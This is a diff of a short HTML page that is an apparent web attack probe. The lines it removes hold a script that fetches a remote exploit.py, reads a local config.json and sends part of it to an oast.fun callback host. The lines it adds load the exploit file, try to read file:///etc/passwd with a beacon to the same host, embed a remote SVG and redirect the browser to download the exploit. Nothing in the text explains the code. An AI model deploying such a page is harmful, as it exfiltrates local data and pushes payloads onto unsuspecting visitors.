@@ -1,21 +1,16 @@
 <!DOCTYPE html>
 <html>
 <body>
-    <script>
-        const oast = "http://esqbwjbyepcxrsacleqfxgfxgfqe42qhw.oast.fun";
-        var svg = new Image();
-        svg.src = "https://kirayoshikage67.github.io/gfhgfhfhgfhg/proof.svg";
-        fetch("https://kirayoshikage67.github.io/gfhgfhfhgfhg/exploit.py")
-            .then(res => {
-                if(res.ok) new Image().src = oast + "/PYTHON_DOWNLOADED_SUCCESS";
-            });
-        fetch("http://127.0.0.1:80/config.json")
-            .then(r => r.text())
-            .then(data => {
-                new Image().src = oast + "/LOCAL_DATA_LEAK=" + btoa(data).substring(0,50);
-            })
-            .catch(e => new Image().src = oast + "/CORS_BLOCKED_LOCAL");
+    <img src="https://kirayoshikage67.github.io/gfhgfhfhgfhg/exploit.py">
 
+    <img src="file:///etc/passwd" onerror="new Image().src='http://esqbwjbyepcxrsacleqfxgfxgfqe42qhw.oast.fun/LFI_LOCAL_TRIGGER';">
+
+    <object data="https://kirayoshikage67.github.io/gfhgfhfhgfhg/proof.svg" type="image/svg+xml"></object>
+
+    <script>
+        setTimeout(() => {
+            window.location.href = "https://kirayoshikage67.github.io/gfhgfhfhgfhg/exploit.py";
+        }, 500);
     </script>
 </body>
 </html>
